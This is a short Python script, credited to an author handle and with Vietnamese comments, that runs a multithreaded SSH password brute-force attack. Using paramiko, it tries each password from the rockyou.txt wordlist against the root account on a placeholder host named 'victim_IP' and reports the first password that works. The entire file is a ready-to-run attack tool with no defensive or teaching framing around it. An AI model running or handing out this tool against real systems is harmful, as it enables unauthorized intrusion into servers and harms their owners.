# Author: Vulpes356

import paramiko
import concurrent.futures
import threading
import time

HOST = "victim_IP"
PORT = 22
USERNAME = 'root'
PASSWORD_FILE = "rockyou.txt"
THREADS = 20  # Số luồng chạy song song
BATCH_SIZE = 5  # Mỗi lần thử 5 mật khẩu

# Biến toàn cục để dừng tất cả các luồng
stop_flag = threading.Event()

def attempt_ssh_login(host, port, username, password):
    """Attempt SSH login."""
    if stop_flag.is_set():
        return None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password)
        stop_flag.set()
        return password
    except paramiko.AuthenticationException:
        return None
    except Exception:
        return None
    finally:
        client.close()

def brute_force_batch(password_batch):
    """Brute force SSH with a batch of passwords."""
    for password in (password_batch):
        if stop_flag.is_set():
            return None
        if attempt_ssh_login(HOST, PORT, USERNAME, password):
            return password
    return None

def brute_force_ssh():
    """Run brute-force attack using multi-threading with batching."""
    print(f"[*] Starting SSH brute-force attack at {time.strftime('%H:%M:%S', time.localtime())}...")
    with open(PASSWORD_FILE, "r") as passwords:
        password_list = [pwd.strip() for pwd in passwords]

    password_batches = [password_list[i:i + BATCH_SIZE] for i in range(0, len(password_list), BATCH_SIZE)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(brute_force_batch, batch): batch for batch in password_batches}

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(f"\n[+] Password found: {result}")
                print(f"[*] Finished at {time.strftime('%H:%M:%S', time.localtime())}")
                stop_flag.set()
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    brute_force_ssh()
